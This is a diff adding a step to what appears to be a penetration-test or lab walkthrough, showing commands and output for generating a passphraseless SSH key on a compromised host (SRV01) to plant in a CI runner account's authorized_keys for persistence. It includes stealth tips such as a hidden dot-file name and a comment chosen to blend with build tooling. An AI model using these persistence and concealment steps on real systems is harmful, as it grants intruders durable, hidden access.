@@ -2707,7 +2707,70 @@ A: command not found
 <br>
 </div>
 
-### 
+### 3.20 — Generate an SSH keypair for runner persistence
+
+**Why this step:** The workflow payload must leave behind durable access rather than a single command's output. An SSH public key appended to `svc-runner`'s `authorized_keys` converts one job execution into an interactive session on a host already reachable.
+
+**Commands:**
+
+```bash
+ssh-keygen -t ed25519 -f /tmp/.runner_key -N '' -C 'ci'
+```
+
+```bash
+cat /tmp/.runner_key.pub
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`ssh-keygen`|Generate an SSH keypair|Make a key to log in with|
+|`-t ed25519`|Use the Ed25519 algorithm|Modern, short, fast|
+|`-f /tmp/.runner_key`|Output path for the private key|Where to save it; public half gets `.pub` appended|
+|`-N ''`|Empty passphrase|Required for non-interactive use — no prompt on login|
+|`-C 'ci'`|Comment field|Innocuous label; blends with build tooling|
+|`cat ...pub`|Print the public key|The half that goes on the target account|
+
+The keypair is generated on SRV01 rather than the attacking host because that is where it will be used — the runner and the SSH service are both on this machine, so no transfer is required.
+
+**Result:**
+
+```shell
+josh@SRV01:~$ ssh-keygen -t ed25519 -f /tmp/.runner_key -N '' -C 'ci'
+Generating public/private ed25519 key pair.
+Your identification has been saved in /tmp/.runner_key
+Your public key has been saved in /tmp/.runner_key.pub
+The key fingerprint is:
+SHA256:cPuvkKA76lTGe+mcMRmQhXBHAlxYjv+u3o5Qs7ljkbY ci
+The key's randomart image is:
++--[ED25519 256]--+
+| .o*=o+          |
+|  o+.=           |
+|  . + . .        |
+|   o . o .       |
+|    B.o S        |
+|   ++B = o       |
+|  o.=oB o .      |
+| . .EX + . .     |
+| .o+*=B   ...    |
++----[SHA256]-----+
+
+josh@SRV01:~$ cat /tmp/.runner_key.pub
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4JeeNtVvz6vDoebjRpOSb21QjhLXQ0ZIiuFXprFckD ci
+josh@SRV01:~$ 
+```
+
+**What this gives you:** A credential the workflow payload can install, granting interactive access as the runner account.
+
+**Key findings:**
+
+- Keypair written to `/tmp/.runner_key` (private) and `/tmp/.runner_key.pub` (public), with no passphrase.
+- The public key is the payload's deliverable. Appending it to `/home/svc-runner/.ssh/authorized_keys` permits `ssh svc-runner@172.16.20.3 -i /tmp/.runner_key` without a password.
+- The leading dot in the filename hides it from a plain `ls` in `/tmp`, and the `ci` comment is consistent with build automation.
+- Persistence via `authorized_keys` survives runner restarts and does not depend on holding an open shell, unlike a reverse connection.
+
+**Next:** Author a malicious workflow that installs this key, and upload it to the fork.
 <div align="center">
 <br>
 <br>
